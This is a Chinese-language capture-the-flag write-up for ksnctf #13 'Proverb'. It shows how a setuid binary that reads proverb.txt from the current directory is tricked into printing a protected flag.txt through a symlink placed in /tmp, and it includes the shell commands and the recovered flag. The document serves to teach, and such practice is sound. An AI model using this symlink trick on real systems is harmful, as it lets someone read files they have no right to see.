---
title: 'ksnctf #13 Proverb'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2018-08-06 15:45:18
categories:
	- Writeups
	- ksnctf
thumbnailImage: ksnctf.png
keywords:
    - ksnctf
    - Proverb
tags:
    - Writeups
---
`ln -s`
<!-- more -->

登入 SSH 以後，目錄底下有 `proverb` 執行檔以及沒有權限讀取的 `flag.txt`。執行 `proverb` 後發現，會讀取 `proverb.txt` 中任一行並且印出來。
```
[q13@localhost ~]$ ll
total 28
-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt
---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb
-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt
-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt
[q13@localhost ~]$ ./proverb
Fire is a good servant but a bad master.
```

有 `/tmp` 路徑可以讀寫，設想如果使用 `ln -s ` 建立檔案連結來讓 `proverb` 讀取 `flag.txt`，flag 就可以順利拿到。

```
[q13@localhost ~]$ mkdir /tmp/the0
[q13@localhost ~]$ ln -s ~/flag.txt /tmp/the0/proverb.txt
[q13@localhost ~]$ cd /tmp/the0
[q13@localhost the0]$ ll
total 0
lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -> /home/q13/flag.txt
[q13@localhost the0]$ ~/proverb
FLAG_XoK9PzskYedj/T&B
```